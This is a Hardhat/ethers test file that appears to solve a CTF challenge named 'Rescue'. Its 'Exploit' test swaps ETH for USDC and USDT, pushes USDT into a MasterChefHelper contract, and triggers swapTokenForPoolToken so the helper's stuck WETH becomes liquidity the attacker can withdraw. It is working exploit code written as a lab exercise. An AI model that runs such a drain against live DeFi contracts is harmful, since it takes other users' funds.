import { ethers } from "hardhat"
import { expect } from "chai"
import WETH9JSON from "../../artifacts/contracts/rescue/Setup.sol/WETH9.json"
import MasterChefHelperJSON from "../../artifacts/contracts/rescue/MasterChefHelper.sol/MasterChefHelper.json"
import { Contract } from "@ethersproject/contracts";

import UniswapV2RouterLikeJson from "../../artifacts/contracts/rescue/UniswapV2Like.sol/UniswapV2RouterLike.json"
import ERC20LikeJson from "../../artifacts/contracts/rescue/MasterChefHelper.sol/ERC20Like.json"

import routerJson from "@uniswap/v2-periphery/build/UniswapV2Router02.json"
import pairJson from "@uniswap/v2-core/build/UniswapV2Pair.json";

describe("[Challenge] Rescue", function () {
    let deployer, attacker;
    let USDC_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
    let USDT_ADDRESS = '0xdac17f958d2ee523a2206206994597c13d831ec7'
    let SUSHI_ROUTER_ADDRESS = '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F'
    let PAIR_ZERO_ADDRESS = '0x06da0fd433C1A5d7a4faa01111c044910A184553'

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();
        /*await ethers.provider.send("hardhat_setBalance", [
            deployer.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);*/

        const SetupFactory = await ethers.getContractFactory(
            "SetupRescue",
            deployer
        );
        this.challenge = await SetupFactory.deploy({gasLimit: 30000000, value: ethers.utils.parseEther('10')});

        expect(await this.challenge.isSolved()).to.equal(false);
    });

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        this.weth = new Contract((await this.challenge.weth()), WETH9JSON.abi, attacker)
        this.usdc = new Contract(USDC_ADDRESS, ERC20LikeJson.abi, attacker)
        this.usdt = new Contract(USDT_ADDRESS, ERC20LikeJson.abi, attacker) //token for the pair with poolId 0
        this.pair = new Contract(PAIR_ZERO_ADDRESS, pairJson.abi, attacker)

        this.mch = new Contract((await this.challenge.mcHelper()), MasterChefHelperJSON.abi, attacker )
        this.sushirouter = new Contract(SUSHI_ROUTER_ADDRESS, routerJson.abi, attacker)

        await this.sushirouter.swapExactETHForTokens(
            0, [this.weth.address, this.usdc.address], attacker.address, (await ethers.provider.getBlock('latest')).timestamp * 2, 
            {
                value: ethers.utils.parseEther('0.01')
            }
        )

        await this.sushirouter.swapExactETHForTokens(
            0, [this.weth.address, this.usdt.address], attacker.address, (await ethers.provider.getBlock('latest')).timestamp * 2, 
            {
                value: ethers.utils.parseEther('10.02')
            }
        )

        await this.usdt.transfer(this.mch.address, await this.usdt.balanceOf(attacker.address))

        let usdcTrading = await this.usdc.balanceOf(attacker.address)

        console.log("WETH balance for masterchef before trading", await this.weth.balanceOf(this.mch.address))
        
        //console.log(`Trading for ${usdcTrading} usdc`)
        await this.usdc.approve(this.mch.address, usdcTrading)
        await this.mch.swapTokenForPoolToken(0, this.usdc.address, usdcTrading, 0)

        //console.log(`USDC balance after ${await this.usdc.balanceOf(attacker.address)}`)
        console.log("WETH balance for masterchef after trading", await this.weth.balanceOf(this.mch.address))
        console.log("USDT balance for masterchef after trading", await this.usdt.balanceOf(this.mch.address))

        //get money back
        await this.pair.approve(this.sushirouter.address, await this.pair.balanceOf(attacker.address))
        await this.sushirouter.removeLiquidity(this.weth.address, this.usdt.address, await this.pair.balanceOf(attacker.address), 0, 0, attacker.address, (await ethers.provider.getBlock('latest')).timestamp * 2)

        await this.weth.transfer(deployer.address, await this.weth.balanceOf(attacker.address))

        console.log(`Final deployer balance ${await this.weth.balanceOf(deployer.address)}`)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.challenge.isSolved()).to.equal(true);
    });
});